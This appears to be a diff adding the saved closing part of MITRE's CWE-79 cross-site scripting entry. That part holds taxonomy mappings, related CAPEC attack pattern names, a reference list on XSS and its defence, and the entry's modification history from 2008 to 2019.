+            <tr><td valign="top">OWASP Top Ten 2004</td><td valign="top">A4</td><td valign="top">Exact</td><td valign="top">Cross-Site Scripting (XSS) Flaws</td></tr>
+            <tr><td valign="top">WASC</td><td valign="top">8</td><td valign="top"></td><td valign="top">Cross-site Scripting</td></tr>
+            <tr><td valign="top">Software Fault Patterns</td><td valign="top">SFP24</td><td valign="top"></td><td valign="top">Tainted input to command</td></tr>
+            <tr><td valign="top">OMG ASCSM</td><td valign="top">ASCSM-<a href="http://cwe.mitre.org/data/definitions/79.html">CWE-79</a> </td><td valign="top"></td><td valign="top"></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Related_Attack_Patterns"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Related_Attack_Patterns');"><img id="ocimg_79_Related_Attack_Patterns" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>Related Attack Patterns</div><div name="oc_79_Related_Attack_Patterns" id="oc_79_Related_Attack_Patterns" class="expandblock"><div class="tabledetail"><div class="indent"><div style="margin-top: 10px"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody><tr><th width="110px" valign="top" nowrap="nowrap">CAPEC-ID</th><th valign="top">Attack Pattern Name</th></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/209.html" target="_blank" rel="noopener noreferrer">CAPEC-209</a></td><td valign="top">XSS Using MIME Type Mismatch</td></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/588.html" target="_blank" rel="noopener noreferrer">CAPEC-588</a></td><td valign="top">DOM-Based XSS</td></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/591.html" target="_blank" rel="noopener noreferrer">CAPEC-591</a></td><td valign="top">Reflected XSS</td></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/592.html" target="_blank" rel="noopener noreferrer">CAPEC-592</a></td><td valign="top">Stored XSS</td></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/63.html" target="_blank" rel="noopener noreferrer">CAPEC-63</a></td><td valign="top">Cross-Site Scripting (XSS)</td></tr>
+            <tr><td valign="top"><a href="http://capec.mitre.org/data/definitions/85.html" target="_blank" rel="noopener noreferrer">CAPEC-85</a></td><td valign="top">AJAX Fingerprinting</td></tr>
+         </tbody></table></div></div></div></div></div><div id="References"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_References');"><img id="ocimg_79_References" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_more.gif" alt="+" border="0"></a> </span>References</div><div name="oc_79_References" id="oc_79_References" class="expandblock"><div class="detail"><div class="indent"><div id="Grouped"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0">
+            <tbody><tr><td valign="top"><div id="REF-709">[REF-709] Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager
+							and Seth Fogie. "XSS Attacks". Syngress. 2007. 
+				</div></td></tr>
+            <tr><td valign="top"><div id="REF-44">[REF-44] Michael 
+Howard, David LeBlanc
+							and John Viega. "24 Deadly Sins of Software Security". "Sin 2: 
+Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting)."
+ Page 31. McGraw-Hill. 2010. 
+				</div></td></tr>
+            <tr><td valign="top"><div id="REF-44">[REF-44] Michael 
+Howard, David LeBlanc
+							and John Viega. "24 Deadly Sins of Software Security". "Sin 3: 
+Web-Client Related Vulnerabilities (XSS)." Page 63. McGraw-Hill. 2010. 
+				</div></td></tr>
+            <tr><td valign="top"><div id="REF-712">[REF-712] "Cross-site scripting". Wikipedia. 2008-08-26. 
+				&lt;<a href="http://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener noreferrer">http://en.wikipedia.org/wiki/Cross-site_scripting</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-7">[REF-7] Michael Howard 
+and
+								David LeBlanc. "Writing Secure Code". Chapter 13, "Web-Specific 
+Input Issues" Page 413. 2nd Edition. Microsoft Press. 2002-12-04. 
+				&lt;<a href="https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223" target="_blank" rel="noopener noreferrer">https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-714">[REF-714] RSnake. "XSS (Cross Site Scripting) Cheat Sheet". &lt;<a href="http://ha.ckers.org/xss.html" target="_blank" rel="noopener noreferrer">http://ha.ckers.org/xss.html</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-715">[REF-715] Microsoft. "Mitigating Cross-site Scripting With HTTP-only Cookies". &lt;<a href="http://msdn.microsoft.com/en-us/library/ms533046.aspx" target="_blank" rel="noopener noreferrer">http://msdn.microsoft.com/en-us/library/ms533046.aspx</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-716">[REF-716] Mark Curphey, Microsoft. "Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!". &lt;<a href="http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx" target="_blank" rel="noopener noreferrer">http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-45">[REF-45] OWASP. "OWASP Enterprise Security API (ESAPI) Project". &lt;<a href="http://www.owasp.org/index.php/ESAPI" target="_blank" rel="noopener noreferrer">http://www.owasp.org/index.php/ESAPI</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-718">[REF-718] Ivan Ristic. "XSS Defense HOWTO". &lt;<a href="http://blog.modsecurity.org/2008/07/do-you-know-how.html" target="_blank" rel="noopener noreferrer">http://blog.modsecurity.org/2008/07/do-you-know-how.html</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-719">[REF-719] OWASP. "Web Application Firewall". &lt;<a href="http://www.owasp.org/index.php/Web_Application_Firewall" target="_blank" rel="noopener noreferrer">http://www.owasp.org/index.php/Web_Application_Firewall</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-720">[REF-720] Web Application Security Consortium. "Web Application Firewall Evaluation Criteria". &lt;<a href="http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html" target="_blank" rel="noopener noreferrer">http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-721">[REF-721] RSnake. "Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest". 2007-07-19. 
+				</div></td></tr>
+            <tr><td valign="top"><div id="REF-722">[REF-722] "XMLHttpRequest allows reading HTTPOnly cookies". Mozilla. &lt;<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=380418" target="_blank" rel="noopener noreferrer">https://bugzilla.mozilla.org/show_bug.cgi?id=380418</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-723">[REF-723] "Apache Wicket". &lt;<a href="http://wicket.apache.org/" target="_blank" rel="noopener noreferrer">http://wicket.apache.org/</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-724">[REF-724] OWASP. "XSS (Cross Site Scripting) Prevention Cheat Sheet". &lt;<a href="http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener noreferrer">http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-725">[REF-725] OWASP. "DOM based XSS Prevention Cheat Sheet". &lt;<a href="http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" target="_blank" rel="noopener noreferrer">http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-726">[REF-726] Jason Lam. "Top 25 series - Rank 1 - Cross Site Scripting". SANS Software Security Institute. 2010-02-22. 
+				&lt;<a href="http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/" target="_blank" rel="noopener noreferrer">http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-62">[REF-62] Mark Dowd, 
+John McDonald
+							and Justin Schuh. "The Art of Software Security Assessment". 
+Chapter 17, "Cross Site Scripting", Page 1071. 1st Edition. Addison 
+Wesley. 2006. 
+				</div></td></tr>
+            <tr><td valign="top"><div id="REF-956">[REF-956] Wikipedia. "Samy (computer worm)". 2018-01-16. &lt;<a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Samy_(computer_worm)</a>&gt;.</div></td></tr>
+            <tr><td valign="top"><div id="REF-962">[REF-962] Object Management Group (OMG). "Automated Source Code Security Measure (ASCSM)". ASCSM-CWE-79. 2016-01. 
+				&lt;<a href="http://www.omg.org/spec/ASCSM/1.0/" target="_blank" rel="noopener noreferrer">http://www.omg.org/spec/ASCSM/1.0/</a>&gt;.</div></td></tr>
+         </tbody></table></div></div></div></div></div><div id="Content_History"><div class="heading"><span id="script"><a href="javascript:toggleblocksOC('79_Content_History');"><img id="ocimg_79_Content_History" src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/head_less.gif" alt="+" border="0"></a> </span>Content History</div><div name="oc_79_Content_History" id="oc_79_Content_History" class="collapseblock"><div class="tabledetail"><div class="indent"><div style="margin-top: 10px"><table class="Detail" width="98%" cellspacing="0" cellpadding="0" border="0"><tbody class="Submissions"><tr><th colspan="3" class="title" valign="top">Submissions</th></tr><tr><th valign="top">Submission Date</th><th valign="top" nowrap="nowrap">Submitter</th><th valign="top" nowrap="nowrap">Organization</th></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap"></td><td valign="top">PLOVER</td><td valign="top"></td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top"></td></tr></tbody><tbody class="Modifications"><tr><th colspan="3" class="title" valign="top">Modifications</th></tr><tr><th valign="top">Modification Date</th><th valign="top" nowrap="nowrap">Modifier</th><th valign="top" nowrap="nowrap">Organization</th></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2008-07-01</td><td valign="top">Eric Dalci</td><td valign="top">Cigital</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Time_of_Introduction</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2008-08-15</td><td valign="top"></td><td valign="top">Veracode</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">Suggested OWASP Top Ten 2004 mapping</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2008-09-08</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated
+ Alternate_Terms, Applicable_Platforms, Background_Details, 
+Common_Consequences, Description, Relationships, Other_Notes, 
+References, Taxonomy_Mappings, Weakness_Ordinalities</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-01-12</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated
+ Alternate_Terms, Applicable_Platforms, Background_Details, 
+Common_Consequences, Demonstrative_Examples, Description, 
+Detection_Factors, Enabling_Factors_for_Exploitation, Name, 
+Observed_Examples, Other_Notes, Potential_Mitigations, References, 
+Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-03-10</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Potential_Mitigations</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-05-27</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Name</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-07-27</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Description</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-10-29</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Observed_Examples, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2009-12-28</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2010-02-16</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2010-04-05</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Description, Potential_Mitigations, Related_Attack_Patterns</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2010-06-21</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2010-09-27</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Potential_Mitigations</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2011-03-29</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Demonstrative_Examples, References</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2011-06-01</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Common_Consequences</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2011-06-27</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2011-09-13</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Detection_Factors, Potential_Mitigations</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2012-05-11</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated References, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2012-10-30</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Potential_Mitigations</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2013-07-17</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2014-07-30</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Relationships, Taxonomy_Mappings</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2015-12-07</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2017-01-19</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Related_Attack_Patterns</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2017-05-03</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Related_Attack_Patterns, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2017-11-08</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated
+ Applicable_Platforms, Causal_Nature, Demonstrative_Examples, 
+Enabling_Factors_for_Exploitation, Likelihood_of_Exploit, 
+Modes_of_Introduction, References, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2018-03-27</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated Alternate_Terms, Demonstrative_Examples, Description, Observed_Examples, References, Relationship_Notes, Relationships</td></tr><tr><td rowspan="2" style="border-bottom:1px solid #BAC5E3" valign="top" nowrap="nowrap">2019-01-03</td><td valign="top">CWE Content Team</td><td valign="top">MITRE</td></tr><tr><td colspan="2" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee" valign="top">updated References, Relationships, Taxonomy_Mappings</td></tr></tbody><tbody class="Previous_Entry_Names"><tr><th colspan="3" class="title" valign="top">Previous Entry Names</th></tr><tr><th valign="top" nowrap="nowrap">Change Date</th><th colspan="3" valign="top" nowrap="nowrap">Previous Entry Name</th></tr><tr><td valign="top" nowrap="nowrap">2008-04-11</td><td colspan="2" valign="top">Cross-site Scripting (XSS)</td></tr><tr><td style="border-bottom:1px solid #BAC5E3" colspan="3"></td></tr><tr><td valign="top" nowrap="nowrap">2009-01-12</td><td colspan="2" valign="top">Failure to Sanitize Directives in a Web Page (aka 'Cross-site scripting' (XSS))</td></tr><tr><td style="border-bottom:1px solid #BAC5E3" colspan="3"></td></tr><tr><td valign="top" nowrap="nowrap">2009-05-27</td><td colspan="2" valign="top">Failure to Preserve Web Page Structure (aka 'Cross-site Scripting')</td></tr><tr><td style="border-bottom:1px solid #BAC5E3" colspan="3"></td></tr><tr><td valign="top" nowrap="nowrap">2010-06-21</td><td colspan="2" valign="top">Failure to Preserve Web Page Structure ('Cross-site Scripting')</td></tr><tr><td style="border-bottom:1px solid #BAC5E3" colspan="3"></td></tr></tbody></table></div></div></div></div></div></div>            ﻿	<div id="More_Message">
+<div style="background-color:#798795; padding:2px; color:#ffffff; font-size:95%; text-align:center">More information is available — Please select a different filter.</div></div>
+
+	</td>
+	<!-- end content pane -->
+  </tr>
+</tbody></table>
+<div id="FootBar">
+<table width="100%" cellpadding="0" border="0">
+<tbody><tr>
+<td><div class="noprint" style="width:15px; height:1px"></div>
+</td>
+<td width="100%">
+		<div id="footbar" class="footbar noprint">
+		<b>Page Last Updated: </b>
+
+
+            January 03, 2019            		</div>
+</td>
+</tr>
+</tbody></table>
+
+<table class="ltgreybackground" style="clear:both" width="100%" cellspacing="0" cellpadding="0" border="0">
+  <tbody><tr>
+	<td colspan="4" id="line"><div class="line">&nbsp;</div>
+	</td>
+  </tr>
+  <tr>
+    <td valign="middle" nowrap="nowrap">
+		<div id="footlogo" class="noprint">
+		<!--<a href="http://www.dhs.gov" target="_blank" rel="noopener noreferrer"><img src="/images/dohs.gif" alt="Department of Homeland Security" border="0" /></a> -->
+		<a href="http://www.mitre.org/" target="_blank" rel="noopener noreferrer"><img src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/mitre_logo.gif" alt="MITRE" width="125" height="36" border="0"></a>
+		</div>
+    </td>
+	<td id="Contentpane" style="padding-top:10px" width="100%" valign="top">
+		<div style="clear:both">
+			<p class="footer">Use of the Common Weakness Enumeration and the associated references from this website are subject to the 
+				<a href="http://cwe.mitre.org/about/termsofuse.html">Terms of Use</a>. For more information, please email <a href="mailto:cwe@mitre.org">cwe@mitre.org</a>.
+			</p>
+			<p class="footer" style="padding-bottom:12px;">CWE is sponsored by the <a target="_blank" rel="noopener noreferrer" href="https://www.dhs.gov/">U.S. Department of Homeland Security</a> (DHS) <a target="_blank" rel="noopener noreferrer" href="https://www.dhs.gov/cisa/cybersecurity-division">Cybersecurity and Infrastructure Security Agency</a> (CISA). Copyright © 2006-2019, The MITRE Corporation. CWE, CWSS, CWRAF, and the CWE logo are trademarks of <a target="_blank" rel="noopener noreferrer" href="http://www.mitre.org/">The MITRE Corporation</a>.</p>
+		</div>
+		</td>
+    <td style="padding-top:10px" valign="top" nowrap="nowrap">
+	<div class="footer">
+		<a href="http://cwe.mitre.org/about/privacy_policy.html">Privacy Policy</a><br>
+		<a href="http://cwe.mitre.org/about/termsofuse.html">Terms of Use</a><br>
+		<a href="http://cwe.mitre.org/sitemap.html">Site Map</a><br>
+		<a href="mailto:cwe@mitre.org">Contact Us</a>
+	</div>
+	</td>
+    <td style="padding-right:20px; padding-left:20px" valign="top" nowrap="nowrap">
+		<div id="footlogo" class="noprint">
+		&nbsp;</div>
+    </td>
+	</tr>
+</tbody></table>
+</div>
+
+
+<!-- Google Analytics Code -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script><script src="CWE%20-%20CWE-79:%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20('Cross-site%20Scripting')%20(3.2)_files/ga.js" type="text/javascript"></script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-5164081-1");
+pageTracker._trackPageview();
+</script>
+
+
+
+
+            
+            </body></html>
